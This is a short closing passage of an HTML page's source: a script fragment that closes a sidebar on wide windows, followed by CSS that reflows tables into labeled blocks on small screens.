    window.addEventListener('resize', () => {
      if (window.innerWidth >= 768) {
        closeSidebar();
      }
    });
  </script>
  <!-- Responsive table styles -->
  <style>
    @media (max-width: 640px) {
      table, thead, tbody, th, td, tr { display: block !important; }
      thead { display: none !important; }
      td { position: relative; padding-left: 50% !important; min-height: 40px; }
      td:before {
        position: absolute;
        top: 0; left: 0; width: 45%;
        white-space: nowrap;
        font-weight: bold;
        color: #a1a1aa;
        padding-left: 10px;
        content: attr(data-label);
      }
    }
  </style>
</body>
</html>
